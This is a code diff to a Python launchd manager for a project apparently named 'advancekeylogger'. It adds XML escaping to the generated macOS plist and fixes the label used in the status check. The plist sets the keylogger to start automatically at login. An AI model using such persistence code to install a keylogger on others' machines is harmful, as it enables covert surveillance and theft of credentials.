@@ -43,7 +43,8 @@ class LaunchdManager:
         return f"Restarted launchd agent {spec.name}"
 
     def status(self, spec) -> str:
-        result = _run(["launchctl", "list", spec.name], check=False)
+        label = _label(spec.name)
+        result = _run(["launchctl", "list", label], check=False)
         if result.returncode == 0:
             return f"{spec.name}: running"
         return f"{spec.name}: not loaded"
@@ -58,10 +59,25 @@ def _label(name: str) -> str:
     return f"com.advancekeylogger.{name}"
 
 
+def _xml_escape(value: str) -> str:
+    """Escape XML special characters in user-provided strings."""
+    return (
+        value
+        .replace("&", "&amp;")
+        .replace("<", "&lt;")
+        .replace(">", "&gt;")
+        .replace('"', "&quot;")
+        .replace("'", "&apos;")
+    )
+
+
 def _render_plist(spec) -> str:
-    python_path = os.environ.get("PYTHON_BIN", sys.executable)
-    label = _label(spec.name)
-    project_dir = str(Path(__file__).resolve().parent.parent)
+    python_path = _xml_escape(os.environ.get("PYTHON_BIN", sys.executable))
+    label = _xml_escape(_label(spec.name))
+    project_dir = _xml_escape(str(Path(__file__).resolve().parent.parent))
+    config_path = _xml_escape(spec.config_path)
+    out_log = _xml_escape(str(Path.home() / "Library" / "Logs" / "advancekeylogger.out.log"))
+    err_log = _xml_escape(str(Path.home() / "Library" / "Logs" / "advancekeylogger.err.log"))
     return f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
   "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -77,7 +93,7 @@ def _render_plist(spec) -> str:
         <string>-m</string>
         <string>main</string>
         <string>--config</string>
-        <string>{spec.config_path}</string>
+        <string>{config_path}</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -87,9 +103,9 @@ def _render_plist(spec) -> str:
         <false/>
     </dict>
     <key>StandardOutPath</key>
-    <string>{Path.home() / "Library" / "Logs" / "advancekeylogger.out.log"}</string>
+    <string>{out_log}</string>
     <key>StandardErrorPath</key>
-    <string>{Path.home() / "Library" / "Logs" / "advancekeylogger.err.log"}</string>
+    <string>{err_log}</string>
 </dict>
 </plist>
 """
